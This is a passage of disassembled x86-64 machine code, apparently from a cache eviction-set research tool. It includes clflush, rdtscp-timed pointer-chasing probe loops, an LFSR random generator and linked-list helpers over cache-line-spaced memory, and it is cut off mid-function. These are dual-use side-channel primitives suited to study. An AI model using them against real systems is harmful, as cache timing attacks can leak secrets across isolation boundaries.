    2588:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    258c:	48 8b 00             	mov    (%rax),%rax
    258f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2593:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2597:	48 8b 00             	mov    (%rax),%rax
    259a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    259e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25a2:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    25a6:	0f 92 c0             	setb   %al
    25a9:	0f b6 d0             	movzbl %al,%edx
    25ac:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25b0:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    25b4:	0f 92 c0             	setb   %al
    25b7:	0f b6 c0             	movzbl %al,%eax
    25ba:	29 c2                	sub    %eax,%edx
    25bc:	89 d0                	mov    %edx,%eax
    25be:	5d                   	pop    %rbp
    25bf:	c3                   	ret

00000000000025c0 <median_uint64>:
    25c0:	55                   	push   %rbp
    25c1:	48 89 e5             	mov    %rsp,%rbp
    25c4:	48 83 ec 10          	sub    $0x10,%rsp
    25c8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    25cc:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    25d0:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    25d4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25d8:	48 8d 15 9d ff ff ff 	lea    -0x63(%rip),%rdx        # 257c <compare_uint64>
    25df:	48 89 d1             	mov    %rdx,%rcx
    25e2:	ba 08 00 00 00       	mov    $0x8,%edx
    25e7:	48 89 c7             	mov    %rax,%rdi
    25ea:	e8 61 ea ff ff       	call   1050 <qsort@plt>
    25ef:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    25f3:	83 e0 01             	and    $0x1,%eax
    25f6:	48 85 c0             	test   %rax,%rax
    25f9:	75 3a                	jne    2635 <median_uint64+0x75>
    25fb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    25ff:	48 d1 e8             	shr    %rax
    2602:	48 c1 e0 03          	shl    $0x3,%rax
    2606:	48 8d 50 f8          	lea    -0x8(%rax),%rdx
    260a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    260e:	48 01 d0             	add    %rdx,%rax
    2611:	48 8b 10             	mov    (%rax),%rdx
    2614:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2618:	48 d1 e8             	shr    %rax
    261b:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    2622:	00 
    2623:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2627:	48 01 c8             	add    %rcx,%rax
    262a:	48 8b 00             	mov    (%rax),%rax
    262d:	48 01 d0             	add    %rdx,%rax
    2630:	48 d1 e8             	shr    %rax
    2633:	eb 19                	jmp    264e <median_uint64+0x8e>
    2635:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2639:	48 d1 e8             	shr    %rax
    263c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    2643:	00 
    2644:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2648:	48 01 d0             	add    %rdx,%rax
    264b:	48 8b 00             	mov    (%rax),%rax
    264e:	c9                   	leave
    264f:	c3                   	ret

0000000000002650 <my_access>:
    2650:	55                   	push   %rbp
    2651:	48 89 e5             	mov    %rsp,%rbp
    2654:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2658:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    265c:	48 8b 02             	mov    (%rdx),%rax
    265f:	90                   	nop
    2660:	5d                   	pop    %rbp
    2661:	c3                   	ret

0000000000002662 <flush>:
    2662:	55                   	push   %rbp
    2663:	48 89 e5             	mov    %rsp,%rbp
    2666:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    266a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    266e:	0f ae 38             	clflush (%rax)
    2671:	90                   	nop
    2672:	5d                   	pop    %rbp
    2673:	c3                   	ret

0000000000002674 <probe_chase_loop>:
    2674:	55                   	push   %rbp
    2675:	48 89 e5             	mov    %rsp,%rbp
    2678:	53                   	push   %rbx
    2679:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    267d:	48 89 75 d8          	mov    %rsi,-0x28(%rbp)
    2681:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2685:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
    2689:	48 89 c3             	mov    %rax,%rbx
    268c:	49 89 d8             	mov    %rbx,%r8
    268f:	49 89 f9             	mov    %rdi,%r9
    2692:	0f ae f0             	mfence
    2695:	0f 01 f9             	rdtscp
    2698:	48 89 c6             	mov    %rax,%rsi

000000000000269b <loop>:
    269b:	0f ae e8             	lfence
    269e:	4d 8b 00             	mov    (%r8),%r8
    26a1:	49 ff c9             	dec    %r9
    26a4:	0f ae e8             	lfence
    26a7:	75 f2                	jne    269b <loop>
    26a9:	0f ae e8             	lfence
    26ac:	0f 01 f9             	rdtscp
    26af:	48 29 f0             	sub    %rsi,%rax
    26b2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    26b6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    26ba:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    26be:	c9                   	leave
    26bf:	c3                   	ret

00000000000026c0 <probe_evset_chase>:
    26c0:	55                   	push   %rbp
    26c1:	48 89 e5             	mov    %rsp,%rbp
    26c4:	53                   	push   %rbx
    26c5:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    26c9:	48 8b 05 50 3a 00 00 	mov    0x3a50(%rip),%rax        # 6120 <conf>
    26d0:	48 8b 00             	mov    (%rax),%rax
    26d3:	48 8d 78 01          	lea    0x1(%rax),%rdi
    26d7:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    26db:	48 89 c3             	mov    %rax,%rbx
    26de:	49 89 d8             	mov    %rbx,%r8
    26e1:	49 89 f9             	mov    %rdi,%r9
    26e4:	0f ae f0             	mfence
    26e7:	0f 01 f9             	rdtscp
    26ea:	48 89 c6             	mov    %rax,%rsi

00000000000026ed <loop2>:
    26ed:	0f ae e8             	lfence
    26f0:	4d 8b 00             	mov    (%r8),%r8
    26f3:	49 ff c9             	dec    %r9
    26f6:	0f ae e8             	lfence
    26f9:	75 f2                	jne    26ed <loop2>
    26fb:	0f ae e8             	lfence
    26fe:	0f 01 f9             	rdtscp
    2701:	48 29 f0             	sub    %rsi,%rax
    2704:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2708:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    270c:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    2710:	c9                   	leave
    2711:	c3                   	ret

0000000000002712 <wait>:
    2712:	55                   	push   %rbp
    2713:	48 89 e5             	mov    %rsp,%rbp
    2716:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    271a:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    271e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2722:	0f 01 f9             	rdtscp
    2725:	89 ce                	mov    %ecx,%esi
    2727:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    272b:	89 31                	mov    %esi,(%rcx)
    272d:	48 c1 e2 20          	shl    $0x20,%rdx
    2731:	48 09 d0             	or     %rdx,%rax
    2734:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2738:	90                   	nop
    2739:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    273d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    2741:	0f 01 f9             	rdtscp
    2744:	89 ce                	mov    %ecx,%esi
    2746:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    274a:	89 31                	mov    %esi,(%rcx)
    274c:	48 c1 e2 20          	shl    $0x20,%rdx
    2750:	48 09 d0             	or     %rdx,%rax
    2753:	48 2b 45 f8          	sub    -0x8(%rbp),%rax
    2757:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
    275b:	72 dc                	jb     2739 <wait+0x27>
    275d:	90                   	nop
    275e:	90                   	nop
    275f:	5d                   	pop    %rbp
    2760:	c3                   	ret

0000000000002761 <lfsr_create>:
    2761:	55                   	push   %rbp
    2762:	48 89 e5             	mov    %rsp,%rbp
    2765:	48 0f c7 f0          	rdrand %rax
    2769:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    276d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2771:	5d                   	pop    %rbp
    2772:	c3                   	ret

0000000000002773 <lfsr_rand>:
    2773:	55                   	push   %rbp
    2774:	48 89 e5             	mov    %rsp,%rbp
    2777:	48 83 ec 20          	sub    $0x20,%rsp
    277b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    277f:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    2786:	00 
    2787:	eb 1b                	jmp    27a4 <lfsr_rand+0x31>
    2789:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    278d:	48 8b 00             	mov    (%rax),%rax
    2790:	48 89 c7             	mov    %rax,%rdi
    2793:	e8 1c 00 00 00       	call   27b4 <lfsr_step>
    2798:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    279c:	48 89 02             	mov    %rax,(%rdx)
    279f:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    27a4:	48 83 7d f8 3f       	cmpq   $0x3f,-0x8(%rbp)
    27a9:	76 de                	jbe    2789 <lfsr_rand+0x16>
    27ab:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    27af:	48 8b 00             	mov    (%rax),%rax
    27b2:	c9                   	leave
    27b3:	c3                   	ret

00000000000027b4 <lfsr_step>:
    27b4:	55                   	push   %rbp
    27b5:	48 89 e5             	mov    %rsp,%rbp
    27b8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    27bc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    27c0:	83 e0 01             	and    $0x1,%eax
    27c3:	48 85 c0             	test   %rax,%rax
    27c6:	74 19                	je     27e1 <lfsr_step+0x2d>
    27c8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    27cc:	48 d1 e8             	shr    %rax
    27cf:	48 89 c2             	mov    %rax,%rdx
    27d2:	48 b8 e2 19 00 00 00 	movabs $0x80000000000019e2,%rax
    27d9:	00 00 80 
    27dc:	48 31 d0             	xor    %rdx,%rax
    27df:	eb 07                	jmp    27e8 <lfsr_step+0x34>
    27e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    27e5:	48 d1 e8             	shr    %rax
    27e8:	5d                   	pop    %rbp
    27e9:	c3                   	ret

00000000000027ea <config_init>:
    27ea:	55                   	push   %rbp
    27eb:	48 89 e5             	mov    %rsp,%rbp
    27ee:	48 83 ec 40          	sub    $0x40,%rsp
    27f2:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    27f6:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    27fa:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    27fe:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    2802:	4c 89 45 c8          	mov    %r8,-0x38(%rbp)
    2806:	4c 89 4d c0          	mov    %r9,-0x40(%rbp)
    280a:	bf 38 00 00 00       	mov    $0x38,%edi
    280f:	e8 cc e8 ff ff       	call   10e0 <malloc@plt>
    2814:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2818:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
    281c:	48 8b 7d d0          	mov    -0x30(%rbp),%rdi
    2820:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    2824:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2828:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    282c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2830:	ff 75 10             	push   0x10(%rbp)
    2833:	ff 75 c0             	push   -0x40(%rbp)
    2836:	4d 89 c1             	mov    %r8,%r9
    2839:	49 89 f8             	mov    %rdi,%r8
    283c:	48 89 c7             	mov    %rax,%rdi
    283f:	e8 0a 00 00 00       	call   284e <config_update>
    2844:	48 83 c4 10          	add    $0x10,%rsp
    2848:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    284c:	c9                   	leave
    284d:	c3                   	ret

000000000000284e <config_update>:
    284e:	55                   	push   %rbp
    284f:	48 89 e5             	mov    %rsp,%rbp
    2852:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2856:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    285a:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    285e:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    2862:	4c 89 45 d8          	mov    %r8,-0x28(%rbp)
    2866:	4c 89 4d d0          	mov    %r9,-0x30(%rbp)
    286a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    286e:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2872:	48 89 10             	mov    %rdx,(%rax)
    2875:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2879:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    287d:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2881:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2885:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2889:	48 89 50 10          	mov    %rdx,0x10(%rax)
    288d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2891:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    2895:	48 89 50 18          	mov    %rdx,0x18(%rax)
    2899:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    289d:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    28a1:	48 89 50 20          	mov    %rdx,0x20(%rax)
    28a5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    28a9:	48 8b 55 10          	mov    0x10(%rbp),%rdx
    28ad:	48 89 50 28          	mov    %rdx,0x28(%rax)
    28b1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    28b5:	48 8b 55 18          	mov    0x18(%rbp),%rdx
    28b9:	48 89 50 30          	mov    %rdx,0x30(%rax)
    28bd:	90                   	nop
    28be:	5d                   	pop    %rbp
    28bf:	c3                   	ret

00000000000028c0 <list_init>:
    28c0:	55                   	push   %rbp
    28c1:	48 89 e5             	mov    %rsp,%rbp
    28c4:	53                   	push   %rbx
    28c5:	48 83 ec 38          	sub    $0x38,%rsp
    28c9:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    28cd:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
    28d1:	bf 00 00 00 00       	mov    $0x0,%edi
    28d6:	e8 e5 e7 ff ff       	call   10c0 <time@plt>
    28db:	89 c7                	mov    %eax,%edi
    28dd:	e8 be e7 ff ff       	call   10a0 <srand@plt>
    28e2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    28e6:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    28ed:	00 
    28ee:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    28f2:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    28f9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    28fd:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    2904:	00 
    2905:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2909:	48 83 c0 18          	add    $0x18,%rax
    290d:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2911:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    2918:	eb 20                	jmp    293a <list_init+0x7a>
    291a:	8b 45 ec             	mov    -0x14(%rbp),%eax
    291d:	48 98                	cltq
    291f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    2926:	00 
    2927:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    292b:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    292f:	e8 3c e8 ff ff       	call   1170 <rand@plt>
    2934:	89 03                	mov    %eax,(%rbx)
    2936:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
    293a:	83 7d ec 09          	cmpl   $0x9,-0x14(%rbp)
    293e:	7e da                	jle    291a <list_init+0x5a>
    2940:	48 c7 45 e0 01 00 00 	movq   $0x1,-0x20(%rbp)
    2947:	00 
    2948:	e9 d5 00 00 00       	jmp    2a22 <list_init+0x162>
    294d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2951:	48 c1 e0 06          	shl    $0x6,%rax
    2955:	48 8d 48 c0          	lea    -0x40(%rax),%rcx
    2959:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    295d:	48 c1 e0 06          	shl    $0x6,%rax
    2961:	48 89 c2             	mov    %rax,%rdx
    2964:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2968:	48 01 d0             	add    %rdx,%rax
    296b:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    296f:	48 01 ca             	add    %rcx,%rdx
    2972:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2976:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    297a:	48 c1 e0 06          	shl    $0x6,%rax
    297e:	48 89 c1             	mov    %rax,%rcx
    2981:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2985:	48 c1 e0 06          	shl    $0x6,%rax
    2989:	48 89 c2             	mov    %rax,%rdx
    298c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2990:	48 01 d0             	add    %rdx,%rax
    2993:	48 8b 40 08          	mov    0x8(%rax),%rax
    2997:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    299b:	48 01 ca             	add    %rcx,%rdx
    299e:	48 89 10             	mov    %rdx,(%rax)
    29a1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    29a5:	48 c1 e0 06          	shl    $0x6,%rax
    29a9:	48 89 c2             	mov    %rax,%rdx
    29ac:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29b0:	48 01 d0             	add    %rdx,%rax
    29b3:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    29ba:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    29be:	48 c1 e0 06          	shl    $0x6,%rax
    29c2:	48 89 c2             	mov    %rax,%rdx
    29c5:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29c9:	48 01 d0             	add    %rdx,%rax
    29cc:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    29d3:	00 
    29d4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    29d8:	48 c1 e0 06          	shl    $0x6,%rax
    29dc:	48 89 c2             	mov    %rax,%rdx
    29df:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    29e3:	48 01 d0             	add    %rdx,%rax
    29e6:	48 83 c0 18          	add    $0x18,%rax
    29ea:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    29ee:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
    29f5:	eb 20                	jmp    2a17 <list_init+0x157>
    29f7:	8b 45 dc             	mov    -0x24(%rbp),%eax
    29fa:	48 98                	cltq
    29fc:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    2a03:	00 
    2a04:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2a08:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    2a0c:	e8 5f e7 ff ff       	call   1170 <rand@plt>
    2a11:	89 03                	mov    %eax,(%rbx)
    2a13:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
    2a17:	83 7d dc 09          	cmpl   $0x9,-0x24(%rbp)
    2a1b:	7e da                	jle    29f7 <list_init+0x137>
    2a1d:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
    2a22:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    2a26:	48 c1 e8 06          	shr    $0x6,%rax
    2a2a:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
    2a2e:	0f 82 19 ff ff ff    	jb     294d <list_init+0x8d>
    2a34:	90                   	nop
    2a35:	90                   	nop
    2a36:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    2a3a:	c9                   	leave
    2a3b:	c3                   	ret

0000000000002a3c <list_push>:
    2a3c:	55                   	push   %rbp
    2a3d:	48 89 e5             	mov    %rsp,%rbp
    2a40:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2a44:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2a48:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    2a4d:	74 42                	je     2a91 <list_push+0x55>
    2a4f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2a53:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2a5a:	00 
    2a5b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a5f:	48 8b 10             	mov    (%rax),%rdx
    2a62:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2a66:	48 89 10             	mov    %rdx,(%rax)
    2a69:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a6d:	48 8b 00             	mov    (%rax),%rax
    2a70:	48 85 c0             	test   %rax,%rax
    2a73:	74 0f                	je     2a84 <list_push+0x48>
    2a75:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a79:	48 8b 00             	mov    (%rax),%rax
    2a7c:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2a80:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2a84:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2a88:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2a8c:	48 89 10             	mov    %rdx,(%rax)
    2a8f:	eb 01                	jmp    2a92 <list_push+0x56>
    2a91:	90                   	nop
    2a92:	5d                   	pop    %rbp
    2a93:	c3                   	ret

0000000000002a94 <list_append>:
    2a94:	55                   	push   %rbp
    2a95:	48 89 e5             	mov    %rsp,%rbp
    2a98:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2a9c:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2aa0:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    2aa5:	0f 84 a3 00 00 00    	je     2b4e <list_append+0xba>
    2aab:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    2ab0:	75 24                	jne    2ad6 <list_append+0x42>
    2ab2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ab6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2abd:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ac1:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2ac8:	00 
    2ac9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2acd:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2ad1:	48 89 10             	mov    %rdx,(%rax)
    2ad4:	eb 79                	jmp    2b4f <list_append+0xbb>
    2ad6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2ada:	48 8b 00             	mov    (%rax),%rax
    2add:	48 85 c0             	test   %rax,%rax
    2ae0:	75 24                	jne    2b06 <list_append+0x72>
    2ae2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ae6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2aed:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2af1:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2af8:	00 
    2af9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2afd:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2b01:	48 89 10             	mov    %rdx,(%rax)
    2b04:	eb 49                	jmp    2b4f <list_append+0xbb>
    2b06:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2b0a:	48 8b 00             	mov    (%rax),%rax
    2b0d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2b11:	eb 0b                	jmp    2b1e <list_append+0x8a>
    2b13:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b17:	48 8b 00             	mov    (%rax),%rax
    2b1a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2b1e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b22:	48 8b 00             	mov    (%rax),%rax
    2b25:	48 85 c0             	test   %rax,%rax
    2b28:	75 e9                	jne    2b13 <list_append+0x7f>
    2b2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b2e:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    2b32:	48 89 10             	mov    %rdx,(%rax)
    2b35:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2b39:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2b3d:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2b41:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2b45:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2b4c:	eb 01                	jmp    2b4f <list_append+0xbb>
    2b4e:	90                   	nop
    2b4f:	5d                   	pop    %rbp
    2b50:	c3                   	ret

0000000000002b51 <list_pop>:
    2b51:	55                   	push   %rbp
    2b52:	48 89 e5             	mov    %rsp,%rbp
    2b55:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2b59:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    2b5e:	74 09                	je     2b69 <list_pop+0x18>
    2b60:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2b64:	48 8b 00             	mov    (%rax),%rax
    2b67:	eb 05                	jmp    2b6e <list_pop+0x1d>
    2b69:	b8 00 00 00 00       	mov    $0x0,%eax
    2b6e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2b72:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2b77:	75 07                	jne    2b80 <list_pop+0x2f>
    2b79:	b8 00 00 00 00       	mov    $0x0,%eax
    2b7e:	eb 44                	jmp    2bc4 <list_pop+0x73>
    2b80:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b84:	48 8b 00             	mov    (%rax),%rax
    2b87:	48 85 c0             	test   %rax,%rax
    2b8a:	74 0f                	je     2b9b <list_pop+0x4a>
    2b8c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b90:	48 8b 00             	mov    (%rax),%rax
    2b93:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2b9a:	00 
    2b9b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2b9f:	48 8b 10             	mov    (%rax),%rdx
    2ba2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2ba6:	48 89 10             	mov    %rdx,(%rax)
    2ba9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bad:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2bb4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bb8:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2bbf:	00 
    2bc0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bc4:	5d                   	pop    %rbp
    2bc5:	c3                   	ret

0000000000002bc6 <list_get>:
    2bc6:	55                   	push   %rbp
    2bc7:	48 89 e5             	mov    %rsp,%rbp
    2bca:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2bce:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2bd2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2bd6:	48 8b 00             	mov    (%rax),%rax
    2bd9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2bdd:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    2be4:	00 
    2be5:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2bea:	75 17                	jne    2c03 <list_get+0x3d>
    2bec:	b8 00 00 00 00       	mov    $0x0,%eax
    2bf1:	eb 33                	jmp    2c26 <list_get+0x60>
    2bf3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bf7:	48 8b 00             	mov    (%rax),%rax
    2bfa:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2bfe:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    2c03:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c08:	74 0d                	je     2c17 <list_get+0x51>
    2c0a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2c0e:	48 8b 00             	mov    (%rax),%rax
    2c11:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    2c15:	72 dc                	jb     2bf3 <list_get+0x2d>
    2c17:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2c1b:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2c1f:	48 89 10             	mov    %rdx,(%rax)
    2c22:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c26:	5d                   	pop    %rbp
    2c27:	c3                   	ret

0000000000002c28 <list_take>:
    2c28:	55                   	push   %rbp
    2c29:	48 89 e5             	mov    %rsp,%rbp
    2c2c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2c30:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2c34:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2c38:	48 8b 00             	mov    (%rax),%rax
    2c3b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2c3f:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    2c46:	00 
    2c47:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c4c:	75 1a                	jne    2c68 <list_take+0x40>
